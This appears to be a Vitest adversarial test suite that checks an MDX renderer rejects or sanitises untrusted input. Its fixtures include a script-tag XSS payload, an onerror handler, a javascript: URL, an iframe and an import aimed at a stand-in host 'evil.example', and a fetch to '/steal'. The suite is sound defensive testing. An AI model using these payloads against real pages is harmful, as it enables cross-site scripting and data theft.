import { describe, it, expect } from 'vitest';
import { renderToStaticMarkup } from 'react-dom/server';
import { validateMdx, renderMdx } from '../lib/mdx';

// The MDX adversarial suite (SPEC §18.3 / §6.1). Imported MDX is untrusted code;
// these fixtures are the attacks the pipeline must survive. Each asserts EXTERNAL
// behavior — what validateMdx reports and what renderMdx actually emits — never
// plugin internals. A regression here is a security regression.
//
// The two contracts under test:
//   validateMdx  → { ok } : the projection endpoint's mdx_ok. false ⇒ the doc
//                            renders as plain-markdown fallback, never as MDX.
//   renderMdx    → { node, ok } : the page render. ok=false ⇒ fell back safely.

async function html(content: string): Promise<{ markup: string; ok: boolean }> {
  const { node, ok } = await renderMdx(content);
  return { markup: renderToStaticMarkup(node), ok };
}

describe('MDX adversarial suite (SPEC §18.3)', () => {
  describe('import / export smuggling → rejected, falls back', () => {
    it('rejects an import statement', async () => {
      const src = "import secret from 'https://evil.example/x'\n\n# Doc";
      expect((await validateMdx(src)).ok).toBe(false);
      const { markup, ok } = await html(src);
      expect(ok).toBe(false); // fell back to plain markdown
      expect(markup).toContain('Doc');
      // The fallback shows the import line as INERT text, never executed code:
      // it appears verbatim in a paragraph and there is no script surface.
      expect(markup).toContain('import secret from');
      expect(markup).not.toContain('<script');
    });

    it('rejects an export statement', async () => {
      const src = 'export const x = 1\n\n# Doc';
      expect((await validateMdx(src)).ok).toBe(false);
      expect((await html(src)).ok).toBe(false);
    });

    it('rejects export default (component override attempt)', async () => {
      const src = 'export default function () { return null }\n\ntext';
      expect((await validateMdx(src)).ok).toBe(false);
    });
  });

  describe('expression payloads → non-literals rejected, literals allowed', () => {
    it('rejects a function-call expression', async () => {
      expect((await validateMdx('Value {fetch("/steal")} here')).ok).toBe(false);
    });

    it('rejects an identifier expression', async () => {
      expect((await validateMdx('{globalThis}')).ok).toBe(false);
    });

    it('rejects a computed expression', async () => {
      expect((await validateMdx('sum: {1 + 1}')).ok).toBe(false);
    });

    it('allows a bare string-literal expression', async () => {
      const { ok } = await html('Value {"forty-two"} here');
      expect(ok).toBe(true);
      expect((await validateMdx('Value {"forty-two"} here')).ok).toBe(true);
    });

    it('allows an empty expression / comment', async () => {
      expect((await validateMdx('a {/* note */} b')).ok).toBe(true);
    });
  });

  describe('script / raw HTML → sanitized against the tight schema', () => {
    it('drops a <script> element but keeps surrounding prose', async () => {
      const { markup, ok } = await html('before\n\n<script>alert(1)</script>\n\nafter');
      expect(ok).toBe(true);
      expect(markup).not.toContain('<script');
      expect(markup).not.toContain('alert(1)');
      expect(markup).toContain('before');
      expect(markup).toContain('after');
    });

    it('drops an <iframe>', async () => {
      const { markup } = await html('<iframe src="https://evil.example"></iframe>\n\nok');
      expect(markup).not.toContain('<iframe');
      expect(markup).not.toContain('evil.example');
    });

    it('strips an event-handler attribute but can keep the element', async () => {
      const { markup } = await html('<div className="wrap">hi</div>');
      expect(markup).not.toContain('onerror');
      expect(markup).not.toContain('onclick');
    });

    it('strips inline event handlers on an allowed tag', async () => {
      const { markup } = await html('<img src="https://ex.com/a.png" onerror="alert(1)" />');
      expect(markup).not.toContain('onerror');
      expect(markup).not.toContain('alert(1)');
    });

    it('neutralizes a javascript: URL on an allowed tag', async () => {
      const { markup } = await html('<a href="javascript:alert(1)">click</a>');
      expect(markup).not.toContain('javascript:');
    });

    it('keeps a safe inline element (kbd)', async () => {
      const { markup } = await html('press <kbd>Esc</kbd> now');
      expect(markup).toContain('<kbd>Esc</kbd>');
    });
  });

  describe('attribute-channel smuggling → rejected', () => {
    it('rejects a non-literal expression in a component prop', async () => {
      expect((await validateMdx('<Callout title={fetch("/x")}>hi</Callout>')).ok).toBe(false);
    });

    it('rejects a spread attribute', async () => {
      expect((await validateMdx('<Callout {...props}>hi</Callout>')).ok).toBe(false);
    });

    it('allows a literal-expression prop', async () => {
      expect((await validateMdx('<Callout type={"warning"}>hi</Callout>')).ok).toBe(true);
    });
  });

  describe('unknown components → neutral box, never a crash', () => {
    it('renders an unknown component as the unsupported box, compiles ok', async () => {
      const src = '<Danger payload="x">boom</Danger>';
      expect((await validateMdx(src)).ok).toBe(true);
      const { markup, ok } = await html(src);
      expect(ok).toBe(true);
      expect(markup).toContain('Unsupported component');
      expect(markup).toContain('Danger');
      expect(markup).not.toContain('boom'); // discarded subtree
    });

    it('renders a namespaced unknown component as the unsupported box', async () => {
      const { markup } = await html('<motion.div>x</motion.div>');
      expect(markup).toContain('Unsupported component');
    });
  });

  describe('allowlisted components → render as Kedge components', () => {
    it('renders a Callout with its children', async () => {
      const { markup, ok } = await html('<Callout title="Heads up">read **this**</Callout>');
      expect(ok).toBe(true);
      expect(markup).toContain('Heads up');
      expect(markup).toContain('<strong>this</strong>');
    });

    it('renders a Warning', async () => {
      const { markup } = await html('<Warning>careful</Warning>');
      expect(markup).toContain('careful');
    });
  });

  describe('pathological input → never crashes', () => {
    it('survives deeply nested emphasis and blockquotes', async () => {
      const nested = '>'.repeat(60) + ' ' + '*'.repeat(40) + 'x' + '*'.repeat(40);
      const { ok } = await html(nested);
      expect(typeof ok).toBe('boolean'); // resolved, did not throw
    });

    it('survives deeply nested allowlisted components', async () => {
      const depth = 40;
      const src = '<Note>'.repeat(depth) + 'deep' + '</Note>'.repeat(depth);
      const { markup } = await html(src);
      expect(markup).toContain('deep');
    });

    it('survives an unterminated component (compile error) via fallback', async () => {
      const { ok } = await html('<Callout>oops');
      expect(typeof ok).toBe('boolean');
    });
  });

  describe('plain markdown MDX → renders unchanged', () => {
    it('renders standard markdown with no JSX', async () => {
      const { markup, ok } = await html('# Title\n\nA paragraph with `code` and a [link](https://ex.com).');
      expect(ok).toBe(true);
      expect(markup).toContain('<h1>Title</h1>');
      expect(markup).toContain('<code>code</code>');
      expect(markup).toContain('href="https://ex.com"');
    });
  });
});
